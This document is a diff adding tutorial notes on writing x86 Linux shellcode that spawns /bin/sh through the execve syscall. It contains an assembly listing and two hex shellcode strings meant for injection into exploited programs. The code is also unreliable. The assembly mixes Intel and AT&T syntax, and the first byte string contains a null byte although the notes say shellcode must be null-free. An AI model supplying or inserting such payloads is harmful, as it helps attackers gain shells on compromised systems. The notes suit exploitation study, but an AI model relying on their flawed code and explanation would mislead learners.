@@ -1,0 +1,60 @@
+shellcode
+
+resources: 
+https://nets.ec/Shellcode/Null-free
+https://www.exploit-db.com/shellcodes
+https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
+
+to write shellcode to run a command, it's pretty straightforward.
+Take a look at the syscall table, we're going to want execve, which in x86 is 11 (0xb)
+
+for execve, we need the path to the file in ebx, args in ecx, and environmental variables in edx.
+
+first, we'll need to zero those registers.  We can't move a null in, because shellcode can't have nulls.
+We can xor a register with itself, though.
+
+        xor  %eax, %eax
+        xor  %ebx, %ebx
+        xor  %ecx, %ecx
+        xor  %edx, %edx
+		
+Next, we need the path.  This is tricky in several different ways.  We want this code to be position independent,
+so we can't just put it in .text or anything like that.  We need to push it onto the stack.  Backwards.
+Also, strings are supposed to end in a null byte.  We can't push a null byte, because it'll get stripped or ignored most
+of the time when we inject.
+
+/bin/sh\x00
+becomes
+hs//nib/
+
+so we start by pushing hs// into eax.
+then shift eax right by 8, getting rid of the first / byte, and appending a 0 after the h
+NOW we can push that onto the stack, followed by nib/ and then move %esp into %ebx.
+
+we can now move 0xb into eax, i just xored with 0x687324 to zero everything but 0xb
+and call throw interrupt 0x80 to execute the syscall.
+
+.intel_syntax noprefix
+.data
+.text
+.globl main
+main:
+        xor  %eax, %eax
+        xor  %ebx, %ebx
+        xor  %ecx, %ecx
+        xor  %edx, %edx
+        mov  %eax, 0x68732f2f
+        shr  %eax, 0x8
+        push %eax
+        push 0x6e69622f
+        mov  %ebx, %esp
+        xor  %eax, 0x687324
+        int  0x80
+		
+Shellcode example
+
+this shellcode:
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb8\x2f\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e\x89\xe3\x35\x24\x73\x68\x00\xcd\x80"
+
+better smaller shellcode x86 /bin/sh
+"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
